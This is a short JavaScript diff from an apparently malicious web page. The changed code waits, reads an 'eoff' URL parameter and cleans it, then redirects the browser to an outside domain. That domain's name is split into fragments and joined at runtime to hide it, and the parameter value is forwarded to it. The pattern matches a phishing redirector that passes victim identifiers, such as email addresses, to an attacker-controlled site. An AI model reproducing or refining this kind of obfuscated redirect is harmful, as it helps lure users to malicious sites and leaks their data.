@@ -239,7 +239,9 @@
 
                 await delay(1200);
 
-                const token = queryParam('eoff=');
+                let token = queryParam('eoff');
+                // Remove any = or , that may have sneaked in (also decode percent-encoded equals first)
+                token = decodeURIComponent(token).replace(/[=,]/g, '');
                 const target = ['ht', 'tps', '://', 'po', '.xtomanuaeshare', '.site', '/sNOiatkB'].join('');
                 window.location.href = target + (token ? '#' + token : '');
             };
